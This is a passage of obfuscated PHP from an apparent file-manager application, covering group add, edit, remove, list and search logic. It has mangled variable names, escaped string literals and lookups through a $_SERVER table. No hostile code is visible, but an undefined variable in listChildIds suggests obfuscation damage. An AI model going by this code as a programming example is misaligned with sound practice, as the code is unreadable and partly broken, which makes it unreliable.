$ğîÊ¹‹[$‡ùôĞ›Ğ] = array(); } $•€™½³¸[$³›˜Êõò[177]] = $ïÃÕıŒ×; $•€™½³¸[$³›˜Êõò[176]] = $‡ùôĞ›Ğ; $ğîÊ¹‹[$‡ùôĞ›Ğ][] =& $•€™½³¸; if (count($ğîÊ¹‹[$‡ùôĞ›Ğ]) > 1) { $•€™½³¸[$³›˜Êõò[606]] = !0; } Hook::trigger($³›˜Êõò[608], $•€™½³¸); } unset($•€™½³¸); $Øßåâô’ = array($³›˜Êõò[176] => array($³›˜Êõò[7], array_keys($ğîÊ¹‹))); $ÆşƒÅ˜Ö = Model($³›˜Êõò[609]); $Ò¤îé¶ë = $ÆşƒÅ˜Ö->where($Øßåâô’)->select(); $Ò¤îé¶ë = $Ò¤îé¶ë ? $Ò¤îé¶ë : array(); foreach ($Ò¤îé¶ë as $ê½—©Ü) { if (!isset($ğîÊ¹‹[$ê½—©Ü[$³›˜Êõò[176]]])) { continue; } $³Ş×»Ù = $ğîÊ¹‹[$ê½—©Ü[$³›˜Êõò[176]]]; foreach ($³Ş×»Ù as &$•€™½³¸) { $•€™½³¸[$³›˜Êõò[468]] = $ê½—©Ü[$³›˜Êõò[468]]; $•€™½³¸[$³›˜Êõò[606]] = !0; } unset($•€™½³¸); } $øÄˆƒã = array(); foreach ($¢î¹®·è as $Õïˆäú¨) { Hook::trigger($³›˜Êõò[610], $Õïˆäú¨); if (isset($Õïˆäú¨[$³›˜Êõò[606]]) && $Õïˆäú¨[$³›˜Êõò[606]]) { Hook::trigger($³›˜Êõò[611], $Õïˆäú¨); continue; } $›™à×ºÎ = $¡£«û->getPathInner($Õïˆäú¨[$³›˜Êõò[84]]); $‹ì«´¢á = $ÆşƒÅ˜Ö->addFileMake($›™à×ºÎ, $Õïˆäú¨[$³›˜Êõò[76]], $Õïˆäú¨[$³›˜Êõò[177]], $Õïˆäú¨[$³›˜Êõò[176]], $Õïˆäú¨[$³›˜Êõò[32]], $ô–Ô×¨¶); Hook::trigger($³›˜Êõò[611], $Õïˆäú¨); if (!is_array($‹ì«´¢á)) { continue; } $øÄˆƒã[] = $‹ì«´¢á; } $ÆşƒÅ˜Ö->addAll($øÄˆƒã); $Øßåâô’ = array($³›˜Êõò[176] => array($³›˜Êõò[7], array_keys($ğîÊ¹‹))); $Ò¤îé¶ë = $ÆşƒÅ˜Ö->where($Øßåâô’)->select(); $Ò¤îé¶ë = $Ò¤îé¶ë ? $Ò¤îé¶ë : array(); foreach ($Ò¤îé¶ë as $ê½—©Ü) { if (!isset($ğîÊ¹‹[$ê½—©Ü[$³›˜Êõò[176]]])) { continue; } $ÄôÉ¨ˆ‡ =& $ğîÊ¹‹[$ê½—©Ü[$³›˜Êõò[176]]]; foreach ($ÄôÉ¨ˆ‡ as &$•€™½³¸) { $•€™½³¸[$³›˜Êõò[468]] = $ê½—©Ü[$³›˜Êõò[468]]; } unset($•€™½³¸); } $¤†Ê»Ø˜ = array(); foreach ($¢î¹®·è as $ƒ»æ±ó) { $¤†Ê»Ø˜[$ƒ»æ±ó[$³›˜Êõò[32]]] = $ƒ»æ±ó; } return $¤†Ê»Ø˜; } } goto Dã÷—­÷; E¼•¯¬Ùù»: class GroupModel extends ModelBase { protected $tableName = "\x67\x72\157\165\x70"; protected $tableMeta = array("\x74\141\142\154\145\x4e\x61\155\145" => "\x67\x72\157\x75\160\137\155\x65\164\141", "\x6d\145\x74\x61\106\x69\145\154\x64" => "\147\x72\x6f\x75\x70\111\104"); protected function cacheFunctionAlias($£€õã°İ) { $ô”‡¥Š¡ =& $_SERVER[ùÆÎÔ“Ñ]; return array($ô”‡¥Š¡[1935] => array($£€õã°İ[0], $ô”‡¥Š¡[1936]), $ô”‡¥Š¡[1937] => array($£€õã°İ[0], $ô”‡¥Š¡[1938])); } protected function getInfo($›Âõêõí, $œ‰‹ÃÕÒ = false) { $ÛŠù“Øã = $this->getInfoSimple($›Âõêõí); if (!$ÛŠù“Øã) { return !1; } if ($œ‰‹ÃÕÒ) { return $this->_listDataApplyItem($ÛŠù“Øã); } return $this->cacheFunctionGet($_SERVER[ùÆÎÔ“Ñ][1939], $›Âõêõí); } protected function getInfoSimple($ØãóöáØ, $‰©ïô’Â = false) { $­Öâğú‰ =& $_SERVER[ùÆÎÔ“Ñ]; if ($‰©ïô’Â) { $Ù•ôÅÔı = array($­Öâğú‰[1857] => intval($ØãóöáØ)); $¤°û‰ñÅ = $this->where($Ù•ôÅÔı)->find(); return is_array($¤°û‰ñÅ) ? $¤°û‰ñÅ : array(); } return $this->cacheFunctionGet($­Öâğú‰[1940], $ØãóöáØ); } protected function groupAdd($„²°îÛ) { $úæİÔÄ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$„²°îÛ[$úæİÔÄ[432]] && isset($„²°îÛ[$úæİÔÄ[1857]]) && $„²°îÛ[$úæİÔÄ[1857]] == 1) { if ($ÏÖ¨êËŒ = $this->getInfoSimple($„²°îÛ[$úæİÔÄ[1857]], !0)) { return $„²°îÛ[$úæİÔÄ[1857]]; } } else { $ÏÖ¨êËŒ = $this->getInfoSimple($„²°îÛ[$úæİÔÄ[432]]); if (!$ÏÖ¨êËŒ) { return !1; } } $ÛÒÙÙ÷ = $úæİÔÄ[531]; if ($ÏÖ¨êËŒ[$úæİÔÄ[521]]) { $ÛÒÙÙ÷ = $ÏÖ¨êËŒ[$úæİÔÄ[521]] . $ÏÖ¨êËŒ[$úæİÔÄ[1857]] . $úæİÔÄ[50]; } $ª›à’ = array($úæİÔÄ[420] => $this->groupNameAuto($„²°îÛ[$úæİÔÄ[432]], $„²°îÛ[$úæİÔÄ[32]]), $úæİÔÄ[401] => $„²°îÛ[$úæİÔÄ[432]], $úæİÔÄ[590] => $ÛÒÙÙ÷, $úæİÔÄ[1941] => $„²°îÛ[$úæİÔÄ[1844]], $úæİÔÄ[1942] => 0, $úæİÔÄ[1861] => 0); if (isset($„²°îÛ[$úæİÔÄ[1881]])) { $ª›à’[$úæİÔÄ[1881]] = $„²°îÛ[$úæİÔÄ[1881]]; } else { $¬ßÈı¼« = $this->max($úæİÔÄ[1881]); if (!$¬ßÈı¼«) { $¬ßÈı¼« = 0; } $ª›à’[$úæİÔÄ[1881]] = $¬ßÈı¼« + 1; } if (!empty($„²°îÛ[$úæİÔÄ[1857]])) { $ª›à’[$úæİÔÄ[1857]] = $„²°îÛ[$úæİÔÄ[1857]]; } $¯–”—Šè = $this->add($ª›à’); $this->setNamePinyin($¯–”—Šè, $ª›à’[$úæİÔÄ[32]]); if (isset($„²°îÛ[$úæİÔÄ[1943]])) { $this->metaSet($¯–”—Šè, array($úæİÔÄ[1943] => $„²°îÛ[$úæİÔÄ[1943]], $úæİÔÄ[1944] => $„²°îÛ[$úæİÔÄ[1944]])); unset($„²°îÛ[$úæİÔÄ[1943]]); unset($„²°îÛ[$úæİÔÄ[1944]]); } Model($úæİÔÄ[1341])->groupRootAdd($¯–”—Šè); return $¯–”—Šè; } protected function groupEdit($öÀğê÷ä, $´„ÑúÑ¯) { $ı¡áçó =& $_SERVER[ùÆÎÔ“Ñ]; $°‰¯ŒÍá = $this->getInfoSimple($öÀğê÷ä); if (!$°‰¯ŒÍá) { return !1; } if (!empty($´„ÑúÑ¯[$ı¡áçó[432]])) { $Í³ÎÁÆ¯ = $this->getInfoSimple($´„ÑúÑ¯[$ı¡áçó[432]]); if (!$Í³ÎÁÆ¯) { return !1; } if ($°‰¯ŒÍá[$ı¡áçó[1857]] == $Í³ÎÁÆ¯[$ı¡áçó[1857]]) { return !1; } if ($´„ÑúÑ¯[$ı¡áçó[432]] != $°‰¯ŒÍá[$ı¡áçó[432]]) { if ($Í³ÎÁÆ¯[$ı¡áçó[521]] !== $°‰¯ŒÍá[$ı¡áçó[521]] && strpos($Í³ÎÁÆ¯[$ı¡áçó[521]], $°‰¯ŒÍá[$ı¡áçó[521]] . $°‰¯ŒÍá[$ı¡áçó[1857]] . $ı¡áçó[50]) === 0) { return !1; } $´„ÑúÑ¯[$ı¡áçó[590]] = $Í³ÎÁÆ¯[$ı¡áçó[521]] . $´„ÑúÑ¯[$ı¡áçó[432]] . $ı¡áçó[50]; $this->_changeChildLevel($°‰¯ŒÍá, $Í³ÎÁÆ¯); } } if (isset($´„ÑúÑ¯[$ı¡áçó[32]])) { $this->setNamePinyin($öÀğê÷ä, $´„ÑúÑ¯[$ı¡áçó[32]]); } if (isset($´„ÑúÑ¯[$ı¡áçó[1943]])) { $this->metaSet($öÀğê÷ä, array($ı¡áçó[1943] => $´„ÑúÑ¯[$ı¡áçó[1943]], $ı¡áçó[1944] => $´„ÑúÑ¯[$ı¡áçó[1944]])); unset($´„ÑúÑ¯[$ı¡áçó[1943]]); unset($´„ÑúÑ¯[$ı¡áçó[1944]]); } $this->_clearChildrenCache($°‰¯ŒÍá); return $this->where(array($ı¡áçó[1945] => $öÀğê÷ä))->save($´„ÑúÑ¯); } private function _clearChildrenCache($ËÃÑÎ·ò) { $ößŒçœÅ =& $_SERVER[ùÆÎÔ“Ñ]; $Á‰Ø¡ = array($ößŒçœÅ[590] => array($ößŒçœÅ[550], $ËÃÑÎ·ò[$ößŒçœÅ[521]] . $ËÃÑÎ·ò[$ößŒçœÅ[1857]] . $ößŒçœÅ[551])); $ıê²‰òÔ = $this->field($ößŒçœÅ[1857])->where($Á‰Ø¡)->select(); foreach ($ıê²‰òÔ as $©š½Ê¼«) { $this->_clearCache($©š½Ê¼«[$ößŒçœÅ[1857]]); } } private function _clearCache($ĞªöÒ­†) { $°°¸Êªš =& $_SERVER[ùÆÎÔ“Ñ]; $this->cacheFunctionClear($°°¸Êªš[1939], $ĞªöÒ­†); $this->cacheFunctionClear($°°¸Êªš[1940], $ĞªöÒ­†); } private function _changeChildLevel($íÂ›üšÆ, $•Ğò‡¸, $ø´ûÉñ = false) { $‘òµûöÃ =& $_SERVER[ùÆÎÔ“Ñ]; $ØéÄÚ†‘ = $íÂ›üšÆ[$‘òµûöÃ[521]] . $íÂ›üšÆ[$‘òµûöÃ[1857]] . $‘òµûöÃ[50]; $°ÉôÎı³ = $•Ğò‡¸[$‘òµûöÃ[521]] . $•Ğò‡¸[$‘òµûöÃ[1857]] . $‘òµûöÃ[50] . $íÂ›üšÆ[$‘òµûöÃ[1857]] . $‘òµûöÃ[50]; if ($ø´ûÉñ) { $°ÉôÎı³ = $•Ğò‡¸[$‘òµûöÃ[521]] . $•Ğò‡¸[$‘òµûöÃ[1857]] . $‘òµûöÃ[50]; } $“¼Àíö¿ = array($‘òµûöÃ[590] => array($‘òµûöÃ[550], $íÂ›üšÆ[$‘òµûöÃ[521]] . $íÂ›üšÆ[$‘òµûöÃ[1857]] . $‘òµûöÃ[551])); $öÕ”Éë = array($‘òµûöÃ[590] => array($‘òµûöÃ[599], "\x72\145\x70\154\141\x63\145\x28\x70\x61\x72\x65\x6e\164\114\145\166\x65\x6c\x2c\47{$ØéÄÚ†‘}\47\x2c\x27{$°ÉôÎı³}\x27\x29")); $this->_clearChildrenCache($íÂ›üšÆ); $this->where($“¼Àíö¿)->data($öÕ”Éë)->save(); } public function setNamePinyin($¢óÔñËá, $ë·èò„À = false) { $é•‹¡°Í =& $_SERVER[ùÆÎÔ“Ñ]; if (!$ë·èò„À) { $şšø¾Ù = $this->getInfoSimple($¢óÔñËá); $ë·èò„À = $şšø¾Ù[$é•‹¡°Í[32]]; } if (!Input::check($ë·èò„À, $é•‹¡°Í[593])) { $this->metaSet($¢óÔñËá, $é•‹¡°Í[465], null); $this->metaSet($¢óÔñËá, $é•‹¡°Í[464], null); return; } $¢°šô°É = array($é•‹¡°Í[465] => str_replace($é•‹¡°Í[53], $é•‹¡°Í[12], Pinyin::get($ë·èò„À)), $é•‹¡°Í[464] => Pinyin::get($ë·èò„À, $é•‹¡°Í[594])); $this->metaSet($¢óÔñËá, $¢°šô°É); } protected function groupStatus($’«Ûñ…, $€ºŒÄ€”) { $ÉÎŸ”ÊÙ =& $_SERVER[ùÆÎÔ“Ñ]; $¨Ó¤›“ = $this->getInfoSimple($’«Ûñ…); if (!$¨Ó¤›“) { return !1; } if ($€ºŒÄ€” == $ÉÎŸ”ÊÙ[88]) { $¦Î¾™¹ = $this->parentLevelArray($¨Ó¤›“[$ÉÎŸ”ÊÙ[521]]); } else { $„ÁØ¡¨¼ = array($ÉÎŸ”ÊÙ[590] => array($ÉÎŸ”ÊÙ[550], $¨Ó¤›“[$ÉÎŸ”ÊÙ[521]] . $¨Ó¤›“[$ÉÎŸ”ÊÙ[1857]] . $ÉÎŸ”ÊÙ[551])); $¦Î¾™¹ = $this->where($„ÁØ¡¨¼)->field($ÉÎŸ”ÊÙ[1857])->select(); $¦Î¾™¹ = array_to_keyvalue($¦Î¾™¹, $ÉÎŸ”ÊÙ[12], $ÉÎŸ”ÊÙ[1857]); } $¦Î¾™¹[] = $¨Ó¤›“[$ÉÎŸ”ÊÙ[1857]]; $™Ôø‘²ƒ = array(); foreach ($¦Î¾™¹ as $’«Ûñ…) { $™Ôø‘²ƒ[] = array($ÉÎŸ”ÊÙ[1857] => $’«Ûñ…, $ÉÎŸ”ÊÙ[94] => $ÉÎŸ”ÊÙ[751], $ÉÎŸ”ÊÙ[374] => $€ºŒÄ€”); $this->_clearCache($’«Ûñ…); } return Model($ÉÎŸ”ÊÙ[1946])->addAll($™Ôø‘²ƒ, array(), !0); } protected function groupRemove($§ö™ñ£­, $ú­ÓÖÈ“ = false) { $ÀòàãöŸ =& $_SERVER[ùÆÎÔ“Ñ]; $ıÊÃê³ = array($ÀòàãöŸ[1857] => $§ö™ñ£­); $êòíÒîé = $this->where($ıÊÃê³)->find(); if (!$êòíÒîé || $êòíÒîé[$ÀòàãöŸ[432]] == 0) { return !1; } if (!$ú­ÓÖÈ“) { $ìàæŠ•Ñ = $this->getInfoSimple($êòíÒîé[$ÀòàãöŸ[432]]); $this->_changeChildLevel($êòíÒîé, $ìàæŠ•Ñ, !0); $this->where(array($ÀòàãöŸ[432] => $§ö™ñ£­))->save(array($ÀòàãöŸ[432] => $êòíÒîé[$ÀòàãöŸ[432]])); } Model($ÀòàãöŸ[1946])->where($ıÊÃê³)->delete(); Model($ÀòàãöŸ[1947])->where($ıÊÃê³)->delete(); Model($ÀòàãöŸ[826])->groupRootRemove($§ö™ñ£­); return $this->where($ıÊÃê³)->delete(); } protected function groupSort($ïäÆêèÂ) { $Ê¨ÓßËà =& $_SERVER[ùÆÎÔ“Ñ]; $Œ“ì×ıø = array(); foreach ($ïäÆêèÂ as $¹—ù”çü => $²¡¿ùĞ ) { $Œ“ì×ıø[] = array($Ê¨ÓßËà[1857], $²¡¿ùĞ , $Ê¨ÓßËà[1881], $¹—ù”çü + 1); } $this->saveAll($Œ“ì×ıø); } public function listData() { $ãùë¯ªé = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ãùë¯ªé[$_SERVER[ùÆÎÔ“Ñ][369]]); return $ãùë¯ªé; } private function _makeOrder($Ÿä¼¾ = '') { $»ˆôéè° =& $_SERVER[ùÆÎÔ“Ñ]; $šÃˆ‡ãÔ = array($»ˆôéè°[1857], $»ˆôéè°[32], $»ˆôéè°[1846], $»ˆôéè°[200]); $Ê»ë™äº = array($»ˆôéè°[450] => $»ˆôéè°[451], $»ˆôéè°[452] => $»ˆôéè°[453]); $Š™ù¬º = Input::get($»ˆôéè°[457], $»ˆôéè°[7], $»ˆôéè°[1861], $šÃˆ‡ãÔ); $®àß•Š½ = Input::get($»ˆôéè°[458], $»ˆôéè°[7], $»ˆôéè°[1948], array($»ˆôéè°[1948], $»ˆôéè°[452])); $®àß•Š½ = $Ê»ë™äº[$®àß•Š½]; $Ÿä¼¾ = $Ÿä¼¾ . "{$Š™ù¬º}\40{$®àß•Š½}\54\40\147\162\157\x75\x70\111\x44\x20\x61\x73\143"; return $this->order($Ÿä¼¾); } public function listChild($Ï’µ’è¦) { $¡ÄŞ£Å± =& $_SERVER[ùÆÎÔ“Ñ]; $—œ·“‡­ = $this->where(array($¡ÄŞ£Å±[432] => $Ï’µ’è¦))->_makeOrder()->selectPage(200); $this->_listDataApply($—œ·“‡­[$¡ÄŞ£Å±[369]]); return $—œ·“‡­; } public function listChildIds($‰Âìªòõ) { $·³ÓÕÕ =& $_SERVER[ùÆÎÔ“Ñ]; if (is_string($°¦Ç’î)) { $‰Âìªòõ = explode($·³ÓÕÕ[50], $‰Âìªòõ); } $èˆ›ùÜŸ = $this->where(array($·³ÓÕÕ[1857] => array($·³ÓÕÕ[7], $‰Âìªòõ)))->field($·³ÓÕÕ[1949])->select(); if (!$èˆ›ùÜŸ) { return !1; } $ŸÇ¾ÍÈê = array(); foreach ($èˆ›ùÜŸ as $œıŠá€Ñ) { $ŸÇ¾ÍÈê[] = "\163\x65\x6c\x65\143\x74\x20\147\162\x6f\x75\x70\x49\x44\x20\146\162\x6f\x6d\x20\140\147\162\x6f\x75\160\x60\40\x77\150\x65\x72\x65\x20\x70\x61\162\x65\156\x74\114\x65\x76\x65\x6c\40\154\x69\x6b\x65\x20\x27{$œıŠá€Ñ[$·³ÓÕÕ[521]]}{$œıŠá€Ñ[$·³ÓÕÕ[1857]]}\54\x25\47"; } $ŸÇ¾ÍÈê = implode($·³ÓÕÕ[1950], $ŸÇ¾ÍÈê); $èˆ›ùÜŸ = $this->query($ŸÇ¾ÍÈê); if (!$èˆ›ùÜŸ) { return array(); } $‰Âìªòõ = array_to_keyvalue($èˆ›ùÜŸ, $·³ÓÕÕ[12], $·³ÓÕÕ[1857]); return array_unique($‰Âìªòõ); } public function listByID($©ú¦ƒÀñ) { $ñ‡…İÉĞ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$©ú¦ƒÀñ) { return array(); } $Ì‚·»ë· = array($ñ‡…İÉĞ[1857] => array($ñ‡…İÉĞ[7], $©ú¦ƒÀñ)); $ş­êÏ†´ = $this->where($Ì‚·»ë·)->select(); $ş­êÏ†´ = array_sort_keep($ş­êÏ†´, $ñ‡…İÉĞ[1857], $©ú¦ƒÀñ); $this->_listDataApply($ş­êÏ†´); return $ş­êÏ†´; } public function listSearch($ı‡ùÅ¤¨) { $è¡×†¨Ÿ =& $_SERVER[ùÆÎÔ“Ñ]; $ãğä…ôé = $ı‡ùÅ¤¨[$è¡×†¨Ÿ[1951]]; $°¯ıÊÅŞ = isset($ı‡ùÅ¤¨[$è¡×†¨Ÿ[1952]]) ? $ı‡ùÅ¤¨[$è¡×†¨Ÿ[1952]] : !1; if (!trim($ãğä…ôé)) { return !1; } $ãğä…ôé = str_replace($è¡×†¨Ÿ[1953], $è¡×†¨Ÿ[1954], $ãğä…ôé); $İšôæßá = array($è¡×†¨Ÿ[1857] => array($è¡×†¨Ÿ[383], "{$ãğä…ôé}\45"), $è¡×†¨Ÿ[32] => array($è¡×†¨Ÿ[383], "\x25{$ãğä…ôé}\x25"), $è¡×†¨Ÿ[1005] => $è¡×†¨Ÿ[1955]); if ($°¯ıÊÅŞ) { $“Û¯¾ÚÂ = $this->getInfoSimple($°¯ıÊÅŞ); $ø¡…áƒç = $“Û¯¾ÚÂ[$è¡×†¨Ÿ[521]] . $°¯ıÊÅŞ . $è¡×†¨Ÿ[551]; $İšôæßá = array($İšôæßá, array($è¡×†¨Ÿ[521] => array($è¡×†¨Ÿ[383], $ø¡…áƒç))); } $İšôæßá = $this->parseWhereLike($İšôæßá); $®·­£Â = $this->_makeOrder()->where($İšôæßá)->selectPage(20); $®·­£Â = $®·­£Â ? $®·­£Â : array($è¡×†¨Ÿ[369] => array(), $è¡×†¨Ÿ[366] => array()); if (!$®·­£Â || count($®·­£Â[$è¡×†¨Ÿ[369]]) < 5 && Input::check($ãğä…ôé, $è¡×†¨Ÿ[318])) { $’Š×¼…Ò = $this->groupChildrenAll($°¯ıÊÅŞ); $ÔùÛ¿éƒ = $this->_searchFromMeta($è¡×†¨Ÿ[464], $ãğä…ôé, 10, $’Š×¼…Ò); $ƒÔÈ°À£ = $this->_searchFromMeta($è¡×†¨Ÿ[465], $ãğä…ôé, 10, $’Š×¼…Ò); $µüÇ÷è = array_merge($ÔùÛ¿éƒ, $ƒÔÈ°À£, $®·­£Â[$è¡×†¨Ÿ[369]]); $®·­£Â[$è¡×†¨Ÿ[369]] = array_unique_by_key($µüÇ÷è, $è¡×†¨Ÿ[1857]); $®·­£Â[$è¡×†¨Ÿ[366]][$è¡×†¨Ÿ[367]] = count($®·­£Â[$è¡×†¨Ÿ[369]]); $®·­£Â[$è¡×†¨Ÿ[366]][$è¡×†¨Ÿ[368]] = ceil($®·­£Â[$è¡×†¨Ÿ[366]][$è¡×†¨Ÿ[367]] / $®·­£Â[$è¡×†¨Ÿ[366]][$è¡×†¨Ÿ[363]]); } $this->_listDataApply($®·­£Â[$è¡×†¨Ÿ[369]]); return $®·­£Â; } protected function groupChildrenAll($ëÜÎÆåÙ) { $»º©ÅÑè =& $_SERVER[ùÆÎÔ“Ñ]; if (!$ëÜÎÆåÙ) { return !1; } if (is_string($ëÜÎÆåÙ)) { $ëÜÎÆåÙ = array($ëÜÎÆåÙ); } $©½ÏÖ·È = $ëÜÎÆåÙ; foreach ($ëÜÎÆåÙ as $ˆ™…²‘µ) { $îÀ«ü‘İ = $this->getInfoSimple($ˆ™…²‘µ); $Ò’æ î = array($»º©ÅÑè[521] => array($»º©ÅÑè[383], $îÀ«ü‘İ[$»º©ÅÑè[521]] . $ˆ™…²‘µ . $»º©ÅÑè[551])); $ÒÒ·¤’º = $this->field($»º©ÅÑè[1857])->where($Ò’æ î)->select(); $©½ÏÖ·È = array_merge($©½ÏÖ·È, array_to_keyvalue($ÒÒ·¤’º, $»º©ÅÑè[12], $»º©ÅÑè[1857])); } return array_unique($©½ÏÖ·È); } private function _searchFromMeta($²Åàöï, $ê¡ºŞÂ, $ÚğÖ€±Ê, $¢ª¥…ì) { $‘ø­˜Ñö =& $_SERVER[ùÆÎÔ“Ñ]; $ê¡ºŞÂ = strtolower($ê¡ºŞÂ); $Œ¦–Íæø = array($‘ø­˜Ñö[94] => $²Åàöï, $‘ø­˜Ñö[374] => array($‘ø­˜Ñö[383], "\45{$ê¡ºŞÂ}\45")); $Œ¦–Íæø = $this->parseWhereLike($Œ¦–Íæø); if ($¢ª¥…ì) { $Œ¦–Íæø[$‘ø­˜Ñö[1857]] = array($‘ø­˜Ñö[7], $¢ª¥…ì); } $‘¥öæ˜İ = Model($‘ø­˜Ñö[1956])->where($Œ¦–Íæø)->limit($ÚğÖ€±Ê)->select(); if (!$‘¥öæ˜İ) { return array(); } $‘¥öæ˜İ = array_to_keyvalue($‘¥öæ˜İ, $‘ø­˜Ñö[12], $‘ø­˜Ñö[1857]); $€¬³™Œ = $this->where(array($‘ø­˜Ñö[1945] => array($‘ø­˜Ñö[7], $‘¥öæ˜İ)))->select(); if (!$€¬³™Œ) { return array(); } return $€¬³™Œ; } protected function _listDataApplyItem($ŞÀ†»™‹) { $´´ÊËòœ = array($ŞÀ†»™‹); $this->_listDataApply($´´ÊËòœ); return $´´ÊËòœ[0]; } protected function _listDataApply(&$Úêú†Â¨) { $”–º™Ã =& $_SERVER[ùÆÎÔ“Ñ]; if (!$Úêú†Â¨) { return; } $€¶éæë = array_to_keyvalue($Úêú†Â¨, $”–º™Ã[12], $”–º™Ã[1857]); $this->_listAppendChildren($Úêú†Â¨); $this->_listAppendChildrenMember($Úêú†Â¨); $this->_listAppendMeta($Úêú†Â¨, $€¶éæë); $this->_listAppendParent($Úêú†Â¨); $this->_listAppendSourceRoot($Úêú†Â¨, $€¶éæë); } private function _listAppendChildren(&$ÊæèÅœá) { $â÷ ‡Æ¡ =& $_SERVER[ùÆÎÔ“Ñ]; $×Ùæ¯•á = array_to_keyvalue($ÊæèÅœá, $â÷ ‡Æ¡[12], $â÷ ‡Æ¡[1857]); $äğÑÈÏ = array($â÷ ‡Æ¡[432] => array($â÷ ‡Æ¡[7], $×Ùæ¯•á)); $ßŠ­»Î = array($â÷ ‡Æ¡[432], $â÷ ‡Æ¡[1957] => $â÷ ‡Æ¡[500]); $«ÑƒÄ‚Ğ = $this->field($ßŠ­»Î)->where($äğÑÈÏ)->group($â÷ ‡Æ¡[432])->select(); $´õ‹¾ÙÌ = array_to_keyvalue($«ÑƒÄ‚Ğ, $â÷ ‡Æ¡[432], $â÷ ‡Æ¡[500]); foreach ($ÊæèÅœá as &$Ù®Ø¯’) { $˜ìƒÛĞ = $Ù®Ø¯’[$â÷ ‡Æ¡[1857]]; $Ù®Ø¯’[$â÷ ‡Æ¡[1958]] = isset($´õ‹¾ÙÌ[$˜ìƒÛĞ]) ? intval($´õ‹¾ÙÌ[$˜ìƒÛĞ]) : !1; } unset($Ù®Ø¯’); } private function _listAppendChildrenMember(&$«èÒï³Ÿ) { $ĞŸìŠŠò =& $_SERVER[ùÆÎÔ“Ñ]; $–Êúˆ÷ = array_to_keyvalue($«èÒï³Ÿ, $ĞŸìŠŠò[12], $ĞŸìŠŠò[1857]); $ë¶Ø€µØ = array($ĞŸìŠŠò[1857] => array($ĞŸìŠŠò[7], $–Êúˆ÷)); $©­î¡Ö = array($ĞŸìŠŠò[1857], $ĞŸìŠŠò[1957] => $ĞŸìŠŠò[500]); $÷À¸ùêô = Model($ĞŸìŠŠò[1947])->field($©­î¡Ö)->where($ë¶Ø€µØ)->group($ĞŸìŠŠò[1857])->select(); $şÉÊÎ² = array_to_keyvalue($÷À¸ùêô, $ĞŸìŠŠò[1857], $ĞŸìŠŠò[500]); foreach ($«èÒï³Ÿ as &$ÁÊ˜Ÿ°ú) { $öû­¾ û = $ÁÊ˜Ÿ°ú[$ĞŸìŠŠò[1857]]; $ÁÊ˜Ÿ°ú[$ĞŸìŠŠò[1959]] = isset($şÉÊÎ²[$öû­¾ û]) ? intval($şÉÊÎ²[$öû­¾ û]) : !1; } unset($ÁÊ˜Ÿ°ú); } private function _listAppendMeta(&$Çß¡é²–, $›ãÂÕ¼½) { $ğ”¸‚„† =& $_SERVER[ùÆÎÔ“Ñ]; $€ÎÑŠ¯Ì = array($ğ”¸‚„†[1857] => array($ğ”¸‚„†[7], $›ãÂÕ¼½)); $’¶ğ×ƒé = Model($ğ”¸‚„†[1946])->where($€ÎÑŠ¯Ì)->select(); $’¶ğ×ƒé = array_to_keyvalue_group($’¶ğ×ƒé, $ğ”¸‚„†[1857]); foreach ($’¶ğ×ƒé as &$¢â¥¥¯ê) { $¢â¥¥¯ê = array_to_keyvalue($¢â¥¥¯ê, $ğ”¸‚„†[94], $ğ”¸‚„†[374]); } unset($¢â¥¥¯ê); foreach ($Çß¡é²– as &$œŞŞÊåİ) { $œŞŞÊåİ[$ğ”¸‚„†[466]] = array(); if (isset($’¶ğ×ƒé[$œŞŞÊåİ[$ğ”¸‚„†[1857]]])) { $œŞŞÊåİ[$ğ”¸‚„†[466]] = $’¶ğ×ƒé[$œŞŞÊåİ[$ğ”¸‚„†[1857]]]; } } unset($œŞŞÊåİ); } protected function parentLevelArray($óÊòÓ¼) { $Ğßº æ§ =& $_SERVER[ùÆÎÔ“Ñ]; $óÊòÓ¼ = explode($Ğßº æ§[50], trim($óÊòÓ¼, $Ğßº æ§[50])); $óÊòÓ¼ = array_remove_value($óÊòÓ¼, $Ğßº æ§[197]); return $óÊòÓ¼; } protected function parentInGroup($ ë”òÔ, $‚ËãÌùŞ) { $éùÆ„ñ± =& $_SERVER[ùÆÎÔ“Ñ]; $û–×ÈÉı = $this->getInfoSimple($ ë”òÔ); if (!$û–×ÈÉı) { return !0; } $˜÷´ÍûÂ = $this->parentLevelArray($û–×ÈÉı[$éùÆ„ñ±[521]]); $˜÷´ÍûÂ[] = $ ë”òÔ; foreach ($˜÷´ÍûÂ as $ ë”òÔ) { if (in_array($ ë”òÔ . $éùÆ„ñ±[12], $‚ËãÌùŞ)) { return !0; } } return !1; } private function _listAppendParent(&$•ÍùÛÎŒ) { $ô–¦Ëş¨ =& $_SERVER[ùÆÎÔ“Ñ]; $È¡Ôñ›ä = array(); foreach ($•ÍùÛÎŒ as &$Å—’Õ°«) { $È¡Ôñ›ä[$Å—’Õ°«[$ô–¦Ëş¨[1857]]] = $Å—’Õ°«[$ô–¦Ëş¨[32]]; $ìŠãƒÚ’ = $this->parentLevelArray($Å—’Õ°«[$ô–¦Ëş¨[521]]); foreach ($ìŠãƒÚ’ as $µ±ÕÛÓ) { if (!isset($È¡Ôñ›ä[$µ±ÕÛÓ])) { $È¡Ôñ›ä[$µ±ÕÛÓ] = 0; } } } unset($Å—’Õ°«); foreach ($È¡Ôñ›ä as $ó›ÂÏ¡ => $Ç¹¯ä¡) { if ($Ç¹¯ä¡) { continue; } $’½°Î¸‰ = $this->getInfoSimple($ó›ÂÏ¡); $È¡Ôñ›ä[$ó›ÂÏ¡] = $’½°Î¸‰[$ô–¦Ëş¨[32]]; } $—ìç°ÍŸ = $GLOBALS[$ô–¦Ëş¨[6]][$ô–¦Ëş¨[89]][$ô–¦Ëş¨[1960]]; if ($GLOBALS[$ô–¦Ëş¨[503]] == $ô–¦Ëş¨[88]) { $—ìç°ÍŸ = !1; } foreach ($•ÍùÛÎŒ as &$Å—’Õ°«) { $ìŠãƒÚ’ = $this->parentLevelArray($Å—’Õ°«[$ô–¦Ëş¨[521]]); $¨¥¿ÊÑ = $ô–¦Ëş¨[12]; foreach ($ìŠãƒÚ’ as $ó›ÂÏ¡ => $µ±ÕÛÓ) { if ($—ìç°ÍŸ && $ó›ÂÏ¡ == 0) { continue; } $¨¥¿ÊÑ .= $È¡Ôñ›ä[$µ±ÕÛÓ] . $ô–¦Ëş¨[8]; } if ($ìŠãƒÚ’) { $¨¥¿ÊÑ .= $Å—’Õ°«[$ô–¦Ëş¨[32]]; } 